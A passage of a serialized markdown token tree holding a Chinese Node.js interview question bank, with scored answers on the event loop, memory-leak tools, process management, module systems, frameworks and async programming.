的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","text":"Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","tokens":[{"type":"text","raw":"Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","text":"Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n\\n- I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n\\n- idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n\\n- poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n\\n- check阶段：执行setImmediate()的回调函数。\\n\\n- close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n\\n","task":false,"loose":true,"text":"timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n","tokens":[{"type":"text","raw":"timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n","text":"timers阶段：处理setTimeout()和setInterval()等定时器事件。","tokens":[{"type":"text","raw":"timers阶段：处理setTimeout()和setInterval()等定时器事件。","text":"timers阶段：处理setTimeout()和setInterval()等定时器事件。","escaped":false}]}]},{"type":"list_item","raw":"- I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n\\n","task":false,"loose":true,"text":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n","tokens":[{"type":"text","raw":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n","text":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。","tokens":[{"type":"text","raw":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。","text":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。","escaped":false}]}]},{"type":"list_item","raw":"- idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n\\n","task":false,"loose":true,"text":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n","tokens":[{"type":"text","raw":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n","text":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。","tokens":[{"type":"text","raw":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。","text":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。","escaped":false}]}]},{"type":"list_item","raw":"- poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n\\n","task":false,"loose":true,"text":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n","tokens":[{"type":"text","raw":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n","text":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。","tokens":[{"type":"text","raw":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。","text":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。","escaped":false}]}]},{"type":"list_item","raw":"- check阶段：执行setImmediate()的回调函数。\\n\\n","task":false,"loose":true,"text":"check阶段：执行setImmediate()的回调函数。\\n","tokens":[{"type":"text","raw":"check阶段：执行setImmediate()的回调函数。\\n","text":"check阶段：执行setImmediate()的回调函数。","tokens":[{"type":"text","raw":"check阶段：执行setImmediate()的回调函数。","text":"check阶段：执行setImmediate()的回调函数。","escaped":false}]}]},{"type":"list_item","raw":"- close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","task":false,"loose":true,"text":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","tokens":[{"type":"text","raw":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","text":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","tokens":[{"type":"text","raw":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","text":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 3. Nodejs的内存泄漏排查方法有哪些？\\n\\n","depth":2,"text":"3. Nodejs的内存泄漏排查方法有哪些？","tokens":[{"type":"text","raw":"3. Nodejs的内存泄漏排查方法有哪些？","text":"3. Nodejs的内存泄漏排查方法有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的内存泄漏排查方法有以下几种：","text":"Node.js的内存泄漏排查方法有以下几种：","tokens":[{"type":"text","raw":"Node.js的内存泄漏排查方法有以下几种：","text":"Node.js的内存泄漏排查方法有以下几种：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n\\n- 使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n\\n- 使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n\\n- 使用代码审查和静态分析工具，如ESLint、JSHint等。\\n\\n- 使用单元测试和集成测试，确保代码的正确性和稳定性。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n\\n","task":false,"loose":true,"text":"使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n","tokens":[{"type":"text","raw":"使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n","text":"使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。","tokens":[{"type":"text","raw":"使用Node.js自带的内存分析工具，如","text":"使用Node.js自带的内存分析工具，如","escaped":false},{"type":"codespan","raw":"`process.memoryUsage()`","text":"process.memoryUsage()"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`heapdump`","text":"heapdump"},{"type":"text","raw":"模块。","text":"模块。","escaped":false}]}]},{"type":"list_item","raw":"- 使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n\\n","task":false,"loose":true,"text":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n","tokens":[{"type":"text","raw":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n","text":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。","tokens":[{"type":"text","raw":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。","text":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n\\n","task":false,"loose":true,"text":"使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n","tokens":[{"type":"text","raw":"使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n","text":"使用内存泄漏检测工具，如`leak`、`memwatch`等。","tokens":[{"type":"text","raw":"使用内存泄漏检测工具，如","text":"使用内存泄漏检测工具，如","escaped":false},{"type":"codespan","raw":"`leak`","text":"leak"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`memwatch`","text":"memwatch"},{"type":"text","raw":"等。","text":"等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用代码审查和静态分析工具，如ESLint、JSHint等。\\n\\n","task":false,"loose":true,"text":"使用代码审查和静态分析工具，如ESLint、JSHint等。\\n","tokens":[{"type":"text","raw":"使用代码审查和静态分析工具，如ESLint、JSHint等。\\n","text":"使用代码审查和静态分析工具，如ESLint、JSHint等。","tokens":[{"type":"text","raw":"使用代码审查和静态分析工具，如ESLint、JSHint等。","text":"使用代码审查和静态分析工具，如ESLint、JSHint等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用单元测试和集成测试，确保代码的正确性和稳定性。","task":false,"loose":true,"text":"使用单元测试和集成测试，确保代码的正确性和稳定性。","tokens":[{"type":"text","raw":"使用单元测试和集成测试，确保代码的正确性和稳定性。","text":"使用单元测试和集成测试，确保代码的正确性和稳定性。","tokens":[{"type":"text","raw":"使用单元测试和集成测试，确保代码的正确性和稳定性。","text":"使用单元测试和集成测试，确保代码的正确性和稳定性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 4. Nodejs的进程管理有哪些方法？\\n\\n","depth":2,"text":"4. Nodejs的进程管理有哪些方法？","tokens":[{"type":"text","raw":"4. Nodejs的进程管理有哪些方法？","text":"4. Nodejs的进程管理有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的进程管理有以下几种方法：","text":"Node.js的进程管理有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的进程管理有以下几种方法：","text":"Node.js的进程管理有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n\\n- 使用`cluster`模块创建集群，利用多核CPU资源。\\n\\n- 使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n\\n- 使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n\\n- 使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n\\n","task":false,"loose":true,"text":"使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n","tokens":[{"type":"text","raw":"使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n","text":"使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`child_process`","text":"child_process"},{"type":"text","raw":"模块创建子进程，并使用","text":"模块创建子进程，并使用","escaped":false},{"type":"codespan","raw":"`process`","text":"process"},{"type":"text","raw":"模块进行进程间通信。","text":"模块进行进程间通信。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`cluster`模块创建集群，利用多核CPU资源。\\n\\n","task":false,"loose":true,"text":"使用`cluster`模块创建集群，利用多核CPU资源。\\n","tokens":[{"type":"text","raw":"使用`cluster`模块创建集群，利用多核CPU资源。\\n","text":"使用`cluster`模块创建集群，利用多核CPU资源。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`cluster`","text":"cluster"},{"type":"text","raw":"模块创建集群，利用多核CPU资源。","text":"模块创建集群，利用多核CPU资源。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n\\n","task":false,"loose":true,"text":"使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n","tokens":[{"type":"text","raw":"使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n","text":"使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`pm2`","text":"pm2"},{"type":"text","raw":"等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。","text":"等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n\\n","task":false,"loose":true,"text":"使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n","tokens":[{"type":"text","raw":"使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n","text":"使用`forever`等第三方工具，如自动重启、日志管理等功能。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`forever`","text":"forever"},{"type":"text","raw":"等第三方工具，如自动重启、日志管理等功能。","text":"等第三方工具，如自动重启、日志管理等功能。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","task":false,"loose":true,"text":"使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","tokens":[{"type":"text","raw":"使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","text":"使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`node-mac`","text":"node-mac"},{"type":"text","raw":"等第三方工具，如自动重启、日志管理等功能。","text":"等第三方工具，如自动重启、日志管理等功能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 5. Nodejs的模块化有哪些方法？\\n\\n","depth":2,"text":"5. Nodejs的模块化有哪些方法？","tokens":[{"type":"text","raw":"5. Nodejs的模块化有哪些方法？","text":"5. Nodejs的模块化有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的模块化有以下几种方法：","text":"Node.js的模块化有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的模块化有以下几种方法：","text":"Node.js的模块化有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n\\n- ES6模块化：使用`import`和`export`进行模块导入和导出。\\n\\n- AMD模块化：使用`define`和`require`进行模块导入和导出。\\n\\n- UMD模块化：兼容CommonJS和AMD模块化。\\n\\n- 全局变量：将变量挂载到`global`对象上，方便全局访问。\\n\\n- 命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n\\n- 模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n\\n","task":false,"loose":true,"text":"CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n","tokens":[{"type":"text","raw":"CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n","text":"CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。","tokens":[{"type":"text","raw":"CommonJS模块化：使用","text":"CommonJS模块化：使用","escaped":false},{"type":"codespan","raw":"`require`","text":"require"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`module.exports`","text":"module.exports"},{"type":"text","raw":"进行模块导入和导出。","text":"进行模块导入和导出。","escaped":false}]}]},{"type":"list_item","raw":"- ES6模块化：使用`import`和`export`进行模块导入和导出。\\n\\n","task":false,"loose":true,"text":"ES6模块化：使用`import`和`export`进行模块导入和导出。\\n","tokens":[{"type":"text","raw":"ES6模块化：使用`import`和`export`进行模块导入和导出。\\n","text":"ES6模块化：使用`import`和`export`进行模块导入和导出。","tokens":[{"type":"text","raw":"ES6模块化：使用","text":"ES6模块化：使用","escaped":false},{"type":"codespan","raw":"`import`","text":"import"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`export`","text":"export"},{"type":"text","raw":"进行模块导入和导出。","text":"进行模块导入和导出。","escaped":false}]}]},{"type":"list_item","raw":"- AMD模块化：使用`define`和`require`进行模块导入和导出。\\n\\n","task":false,"loose":true,"text":"AMD模块化：使用`define`和`require`进行模块导入和导出。\\n","tokens":[{"type":"text","raw":"AMD模块化：使用`define`和`require`进行模块导入和导出。\\n","text":"AMD模块化：使用`define`和`require`进行模块导入和导出。","tokens":[{"type":"text","raw":"AMD模块化：使用","text":"AMD模块化：使用","escaped":false},{"type":"codespan","raw":"`define`","text":"define"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`require`","text":"require"},{"type":"text","raw":"进行模块导入和导出。","text":"进行模块导入和导出。","escaped":false}]}]},{"type":"list_item","raw":"- UMD模块化：兼容CommonJS和AMD模块化。\\n\\n","task":false,"loose":true,"text":"UMD模块化：兼容CommonJS和AMD模块化。\\n","tokens":[{"type":"text","raw":"UMD模块化：兼容CommonJS和AMD模块化。\\n","text":"UMD模块化：兼容CommonJS和AMD模块化。","tokens":[{"type":"text","raw":"UMD模块化：兼容CommonJS和AMD模块化。","text":"UMD模块化：兼容CommonJS和AMD模块化。","escaped":false}]}]},{"type":"list_item","raw":"- 全局变量：将变量挂载到`global`对象上，方便全局访问。\\n\\n","task":false,"loose":true,"text":"全局变量：将变量挂载到`global`对象上，方便全局访问。\\n","tokens":[{"type":"text","raw":"全局变量：将变量挂载到`global`对象上，方便全局访问。\\n","text":"全局变量：将变量挂载到`global`对象上，方便全局访问。","tokens":[{"type":"text","raw":"全局变量：将变量挂载到","text":"全局变量：将变量挂载到","escaped":false},{"type":"codespan","raw":"`global`","text":"global"},{"type":"text","raw":"对象上，方便全局访问。","text":"对象上，方便全局访问。","escaped":false}]}]},{"type":"list_item","raw":"- 命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n\\n","task":false,"loose":true,"text":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n","tokens":[{"type":"text","raw":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n","text":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。","tokens":[{"type":"text","raw":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。","text":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。","escaped":false}]}]},{"type":"list_item","raw":"- 模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","task":false,"loose":true,"text":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","tokens":[{"type":"text","raw":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","text":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","tokens":[{"type":"text","raw":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","text":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 6. 讲一下常见的Nodejs框架？\\n\\n","depth":2,"text":"6. 讲一下常见的Nodejs框架？","tokens":[{"type":"text","raw":"6. 讲一下常见的Nodejs框架？","text":"6. 讲一下常见的Nodejs框架？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n\\n- Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n\\n- Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n\\n- Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n\\n","task":false,"loose":true,"text":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n","tokens":[{"type":"text","raw":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n","text":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。","tokens":[{"type":"text","raw":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。","text":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。","escaped":false}]}]},{"type":"list_item","raw":"- Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n\\n","task":false,"loose":true,"text":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n","tokens":[{"type":"text","raw":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n","text":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。","tokens":[{"type":"text","raw":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。","text":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。","escaped":false}]}]},{"type":"list_item","raw":"- Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n\\n","task":false,"loose":true,"text":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n","tokens":[{"type":"text","raw":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n","text":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。","tokens":[{"type":"text","raw":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。","text":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。","escaped":false}]}]},{"type":"list_item","raw":"- Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","task":false,"loose":true,"text":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","tokens":[{"type":"text","raw":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","text":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","tokens":[{"type":"text","raw":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","text":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. Nodejs的异步编程有哪些方法？\\n\\n","depth":2,"text":"7. Nodejs的异步编程有哪些方法？","tokens":[{"type":"text","raw":"7. Nodejs的异步编程有哪些方法？","text":"7. Nodejs的异步编程有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 